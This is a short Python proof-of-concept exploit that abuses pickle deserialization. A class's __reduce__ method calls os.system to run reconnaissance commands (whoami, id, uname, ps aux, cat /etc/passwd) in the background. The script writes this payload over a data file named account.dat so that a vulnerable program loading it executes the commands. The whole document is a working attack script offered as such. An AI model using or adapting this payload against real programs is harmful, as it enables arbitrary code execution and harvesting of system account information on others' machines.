import pickle
import os

class Malicious:
    def __reduce__(self):
        # Execute commands in the background and suppress output
        # this command, will collect system information and redirects the output to a file
        return (os.system, ("(set -x; whoami; id; uname -a; ps aux; cat /etc/passwd) > Vulnerable_output.txt 2>&1 &",))

# Generate malicious payload
payload = pickle.dumps(Malicious())

# Overwrite the serialized file with the malicious object
with open("account.dat", "wb") as f:
    f.write(payload)

print("Malicious payload injected when the vulnerable program is run it will trigger the exploit.")

